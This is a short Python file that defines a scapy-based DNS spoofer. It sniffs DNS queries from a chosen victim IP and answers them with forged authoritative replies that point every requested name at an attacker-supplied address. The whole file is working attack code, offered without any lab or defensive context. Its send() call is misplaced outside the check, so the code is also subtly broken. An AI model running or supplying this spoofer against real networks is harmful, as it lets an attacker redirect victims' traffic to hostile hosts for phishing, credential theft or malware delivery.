from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP


class DNSSpoofer:
    def __init__(self, interface, ip_victim, ip_to_spoof):
        self.interface = interface
        self.ip_victim = ip_victim
        self.ip_to_spoof = ip_to_spoof

    def spoof(self):
        sniff(
            filter="udp port 53",
            prn=self._on_dns_request,
            iface=self.interface,
            count=0,
        )

    def _on_dns_request(self, packet):
        # Check that we received a DNS query. And check that the query comes from the victim.
        if (
            packet.haslayer(DNSQR)
            and packet[DNS].qr == 0
            and packet[IP].src == self.ip_victim
        ):
            # Construct the DNS response
            response = (
                IP(dst=packet[IP].src, src=packet[IP].dst)
                / UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)
                / DNS(
                    id=packet[DNS].id,
                    qd=packet[DNS].qd,
                    aa=1,
                    qr=1,
                    an=DNSRR(rrname=packet[DNSQR].qname, rdata=self.ip_to_spoof),
                )
            )

        send(response, verbose=0)
